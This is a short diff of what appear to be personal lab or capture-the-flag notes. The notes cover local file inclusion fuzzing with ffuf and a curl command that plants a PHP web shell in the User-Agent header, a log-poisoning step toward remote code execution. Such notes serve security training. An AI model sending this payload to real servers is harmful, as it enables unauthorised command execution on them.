@@ -19,8 +19,11 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http:/
 
 ![[Pasted image 20241011132046.png]]
 
-```php
+```bash
 curl -A '<?php system($_GET['cmd']); ?>' http://83.136.253.171:44707
 ```
+
+![[Pasted image 20241011133107.png]]
+
 
 
